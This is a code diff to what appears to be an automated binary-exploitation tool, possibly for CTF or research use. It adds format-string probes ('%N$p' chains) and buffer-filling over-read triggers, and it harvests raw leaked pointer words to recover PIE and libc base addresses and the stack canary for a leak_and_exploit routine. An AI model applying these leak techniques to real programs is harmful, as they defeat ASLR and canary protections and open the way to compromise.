@@ -20,6 +20,15 @@ from ..dynamic import sandbox
 
 
 def _kill(p):
+    # Close the pipes FIRST so a half-filled stdin BufferedWriter does not raise an *unraisable*
+    # BrokenPipeError when it is later GC'd and tries to flush to a process we just killed (a target
+    # that exits mid-leak makes this the common case; pytest turns the unraisable into a warning).
+    for stream in (getattr(p, "stdin", None), getattr(p, "stdout", None)):
+        try:
+            if stream is not None:
+                stream.close()
+        except Exception:                                    # noqa: BLE001
+            pass
     try:
         os.killpg(os.getpgid(p.pid), 9)
     except OSError:
@@ -77,6 +86,11 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                 out.append(int(grp, 16))
             except ValueError:
                 pass
+        # Auto base recovery also consumes a RAW over-read: a write(fd,buf,BIG)/puts spills stack
+        # memory as binary words (no hex text), which the regex never sees. recover_pie_base /
+        # recover_libc_base corroborate across these, so harvest them alongside the hex.
+        if base_from_leaks is not None:
+            out += _le_pointer_words(b)
         return out
 
     deadline = time.time() + timeout
@@ -92,7 +106,8 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                     break
                 buf += chunk
                 last_data = time.time()
-                if rx.search(buf):
+                # a hex match, or (auto mode) a raw over-read word, means the burst has started
+                if rx.search(buf) or (base_from_leaks is not None and _le_pointer_words(buf)):
                     leaked = True
                     # a format-string leak prints its whole burst at once, then the target
                     # blocks on our payload read (no EOF, no exit) -- so once something matched,
@@ -1001,6 +1016,13 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
     triggers += [seq[:read_cap] + b"\n"]
     triggers += [(b"|".join(b"%%%d$p" % i for i in range(a, a + 12)) + b"\n")[:read_cap] + b"\n"
                  for a in (7, 19, 31)]
+    # Over-read / uninitialized-print provocation (CWE-125): FILL the input buffer with non-NUL bytes
+    # so a following over-long or unbounded output primitive -- write(fd,buf,BIG), puts, fwrite,
+    # printf("%s",buf) -- echoes the stack PAST the buffer (saved rbp, canary, a return into PIE code,
+    # libc pointers) as RAW little-endian words that `_le_pointer_words` harvests. This is the common
+    # leak with no printf(user) sink at all. Sent WITHOUT a trailing newline so a raw read(fd,buf,N)
+    # returns the moment the buffer is full; several sizes cover the unknown buffer length.
+    triggers += [b"A" * n for n in (64, 128, 256)]
     best = {"pie_base": None, "libc_base": None, "canary": None, "trigger": None, "dump": b""}
     for trig in triggers:
         preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
